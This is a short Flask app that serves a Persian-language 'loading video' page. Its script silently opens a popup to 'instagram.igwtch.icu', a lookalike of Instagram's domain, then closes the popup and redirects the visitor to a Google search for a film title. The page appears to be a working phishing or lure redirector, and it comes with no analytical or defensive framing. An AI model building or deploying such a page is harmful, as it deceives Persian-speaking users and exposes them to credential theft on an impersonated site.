from flask import Flask, render_template_string

app = Flask(__name__)

HTML = '''
<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>در حال بارگذاری...</title>
  <style>
    body {
      background: white;
      color: #444;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: sans-serif;
    }
  </style>
</head>
<body>
  <h1>در حال بارگذاری ویدیو...</h1>
  <script>
    var win = window.open("https://instagram.igwtch.icu?video=986907192", "_blank");

    setTimeout(function() {
      if (win) win.close();
      window.location.href = "https://www.google.com/search?q=فیلم+مسافران";
    }, 17000);
  </script>
</body>
</html>
'''

@app.route("/start")
def start():
    return render_template_string(HTML)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)